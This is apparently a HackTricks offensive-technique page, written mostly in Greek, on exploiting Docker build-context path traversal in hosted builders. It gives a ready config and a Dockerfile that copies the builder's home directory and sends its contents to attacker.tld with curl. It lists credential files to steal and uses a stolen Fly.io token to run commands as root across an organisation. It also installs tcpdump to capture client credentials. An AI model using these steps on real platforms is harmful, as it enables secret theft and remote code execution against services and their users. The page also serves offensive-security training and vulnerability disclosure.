# Κατάχρηση Docker Build Context in Hosted Builders (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

Αν μια CI/CD πλατφόρμα ή hosted builder επιτρέπει σε contributors να καθορίζουν το Docker build context path και το Dockerfile path, συχνά μπορείς να ορίσεις το context σε έναν parent directory (π.χ. "..") και να κάνεις αρχεία του host μέρος του build context. Έπειτα, ένα attacker-controlled Dockerfile μπορεί να COPY και να exfiltrate secrets που βρίσκονται στο home του builder χρήστη (π.χ. ~/.docker/config.json). Κλεμμένα registry tokens μπορεί επίσης να λειτουργήσουν ενάντια στα control-plane APIs του provider, επιτρέποντας org-wide RCE.

## Επιφάνεια επίθεσης

Πολλές hosted builder/registry υπηρεσίες κάνουν περίπου τα εξής όταν build-άρουν user-submitted images:
- Read a repo-level config that includes:
- build context path (sent to the Docker daemon)
- Dockerfile path relative to that context
- Copy the indicated build context directory and the Dockerfile to the Docker daemon
- Build the image and run it as a hosted service

Αν η πλατφόρμα δεν canonicalize και δεν περιορίζει το build context, ένας χρήστης μπορεί να το ορίσει σε μια τοποθεσία εκτός του repository (path traversal), προκαλώντας αρχεία του host που είναι αναγνώσιμα από τον build user να γίνουν μέρος του build context και να είναι διαθέσιμα για COPY μέσα στο Dockerfile.

Πρακτικοί περιορισμοί που παρατηρούνται συνήθως:
- The Dockerfile must reside within the chosen context path and its path must be known ahead of time.
- The build user must have read access to files included in the context; special device files can break the copy.

## PoC: Path traversal via Docker build context

Παράδειγμα malicious server config που δηλώνει ένα Dockerfile μέσα στο parent directory context:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
Σημειώσεις:
- Η χρήση των ".." συχνά επιλύεται στο home του χρήστη builder (π.χ., /home/builder), το οποίο συνήθως περιέχει ευαίσθητα αρχεία.
- Τοποθετήστε το Dockerfile σας κάτω από το όνομα του φακέλου του repo (π.χ., repo "test" → test/Dockerfile) ώστε να παραμένει εντός του expanded parent context.

## PoC: Dockerfile to ingest and exfiltrate the host context
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
Στόχοι που ανακτώνται συχνά από το $HOME:
- ~/.docker/config.json (registry auths/tokens)
- Άλλα cloud/CLI cache και config (π.χ., ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

Tip: Ακόμα κι αν υπάρχει .dockerignore στο αποθετήριο, η ευάλωτη επιλογή context από την πλευρά της πλατφόρμας εξακολουθεί να καθορίζει τι αποστέλλεται στον daemon. Αν η πλατφόρμα αντιγράψει το επιλεγμένο path στον daemon πριν αξιολογήσει το .dockerignore του repo σας, αρχεία του host ενδέχεται να εκτεθούν.

## Cloud pivot with overprivileged tokens (παράδειγμα: Fly.io Machines API)

Μερικές πλατφόρμες εκδίδουν ένα ενιαίο bearer token που μπορεί να χρησιμοποιηθεί τόσο για το container registry όσο και για το control-plane API. Αν εξάγετε ένα registry token, δοκιμάστε το στο provider API.

Παραδείγματα κλήσεων API προς το Fly.io Machines API χρησιμοποιώντας το κλεμμένο token από ~/.docker/config.json:

Απαρίθμηση εφαρμογών σε ένα org:
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
Εκτέλεσε μια εντολή ως root μέσα σε οποιαδήποτε μηχανή μιας εφαρμογής:
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
Αποτέλεσμα: org-wide remote code execution across all hosted apps where the token holds sufficient privileges.

## Κλοπή secrets από compromised hosted services

Με exec/RCE σε hosted servers, μπορείτε να συλλέξετε client-supplied secrets (API keys, tokens) ή να πραγματοποιήσετε prompt-injection attacks. Παράδειγμα: εγκαταστήστε tcpdump και καταγράψτε HTTP traffic στην port 8080 για να εξαγάγετε inbound credentials.
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
Οι captured requests συχνά περιέχουν client credentials στα headers, bodies ή query params.

## Αναφορές

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
